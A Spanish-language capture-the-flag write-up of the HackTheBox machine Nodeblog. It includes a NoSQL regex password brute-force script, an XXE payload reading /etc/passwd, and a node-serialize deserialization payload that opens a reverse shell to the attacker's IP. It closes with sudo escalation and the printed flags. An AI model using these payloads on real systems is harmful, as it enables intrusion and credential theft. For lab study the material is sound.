---
title: HackTheBox - Nodeblog
author: cotes
date: 2023-09-06 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Linux, 'NoSQL Injection', 'Prototype Pollution']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Nodeblog/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Nodeblog Machine Logo
---

Máquina Linux de nivel **Easy** de HackTheBox.

Técnicas usadas: **SSTI, NoSQL Injection, Prototype Pollution**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos en la **`Máquina NodeBlog`**

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/Machines/Nodeblog/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos

* **`nmap -p<Ports> -sCV <IP> -oN versiones`**

    ![](/assets/images/Machines/Nodeblog/02-versions.png)

    * Se ejecuta **Node.js** en el puerto **5000**

c. Al visitar el sitio web ejecutándose en el puerto **5000** nos encontramos con un panel de autenticación, veremos como se envía la data con **Burp Suite**

```bash
user=admin&password=admin
```

* Al intentar con inyecciones **`SQL`** no funcionan, así que otro método son las inyecciones **`NoSQL`**

    🔷 Si ingresamos un nombre de usuario **válido** nos saldrá un mensaje de **`Invalid Password`**, por lo cual tenemos una forma de enumerar usuarios válidos.

    ![](/assets/images/Machines/Nodeblog/03-burp.png)
    > **`"$ne"`** significa **`no equal`**, por lo que nos loguearemos como el usuario **`admin`** y que no tenga por contraseña **`a`**


    * Creamos un script para dumpear la contraseña de este usuario

        ```python
        import requests
        import string
        from pwn import *

        def brute_force() -> None:
            main_url = "http://<IP>:5000/login"
            characteres = string.ascii_letters + string.digits
            headers = {"Content-Type": "application/json"}
            password=""
            bar_1 = log.progress("Brute Force")
            bar_1.status("Starting Brute Force...")
            bar_2 = log.progress("Password")

            for index in range(26):
                for character in characteres:
                    k = password+character
                    data = '{"user":"admin","password":{"$regex":"^'+k+'.*"}}'
                    r = requests.post(main_url, headers=headers, data=data)
                    bar_1.status(data)

                    if("Invalid Password" not in r.text):
                        password += character
                        bar_2.status(password)
                        break
        if __name__ == "__main__":
            brute_force()
        ------------------------------------------------------------------------
        [◓] Password: IppsecSaysPleaseSubscribe
        ```

d. Una vez nos autenticamos en el servicio, existe un apartado para subir ficheros el cual únicamente acepta **ficheros XML**

![](/assets/images/Machines/Nodeblog/04-error.png)

* Creamos un fichero **XML Malicioso** para comprobar si la página web es vulnerable a **XXE**

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <root>
        <title>Test</title>
        <description>&xxe;</description>
        <markdown>Test</markdown>
    </root>
    ```

    ![](/assets/images/Machines/Nodeblog/05-xxe.png)

* Si queremos leer archivos importantes del servidor, debemos saber en que ruta estamos actualmente, y para eso, lo que haremos es provocar un error

    ![](/assets/images/Machines/Nodeblog/06-error-based.png)
    > La ruta actual es **/opt/blog**

* Los nombres más comúnes de archivos que contenga el código de la página web son **app.js, server.js, main.js**. Iremos testeando con cada uno en el ataque **XXE**

    * La ruta es **`/opt/blog/service.js`**

    ```
    <SNIP>
    const serialize = require('node-serialize')

    function authenticated(c) {
        c = serialize.unserialize(c)
    }
        res.render('articles/index', { articles: articles, ip: req.socket.remoteAddress, authenticated: authenticated(req.cookies.auth) })
    <SNIP>
    ```
    > Al anlizar el código filtrado por el **XXE** vemos que se serializa una **deserialización** de las **cookies**

e. El ataque que ejecutaremos es **`Prototype Pollution`**, inyectaremos el código en las cookies

* Usaremos [nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) para crear un payload 

    ```bash
    python2 serialize.py 10.10.14.115 4444
    ```

f. En [HackTricks](https://book.hacktricks.xyz/pentesting-web/deserialization) vemos un payload al cual sumaremos el output del comando anterior

```py
{"rce":"_$$ND_FUNC$$_function(){payload}()"}
```
> Lo más importante en el payload son los **()** al final, ya que esto hará que nuestro payload se ejecute antes de ser **deserializado**

* El payload final los urlencodeados **echo -n 'payload' | jq -sSr @uri**

g. Nos ponemos en escucha con **nc -lvnp 4444** y el **payload urlencodeado** lo sustituimos en las **cookies** del navegador y recargamos la página

```bash
listening on [any] 4444 ...
connect to [10.10.14.115] from (UNKNOWN) [10.10.11.139] 39540
Connected!
whoami
admin
```

### Escalada de Privilegios 💹

a. Listamos los permisos que tengamos como **`admin`**

```bash
admin@nodeblog:/opt/blog$ sudo -l 
sudo -l
[sudo] password for admin: IppsecSaysPleaseSubscribe

User admin may run the following commands on nodeblog:
    (ALL) ALL
    (ALL : ALL) ALL
```
> Podemos ejecutar cualquier comando como **`root`**

b. Ejecutamos **`sudo su`** y leemos las **`flags`**

```bash
admin@nodeblog:/opt/blog$ sudo su
root@nodeblog:/opt/blog# cat /home/admin/user.txt
c51fb8fabc95d5f33a6906d850a5f997
root@nodeblog:/opt/blog# cat /root/root.txt
b4dbf647e084f886321b196d4b4643fd
```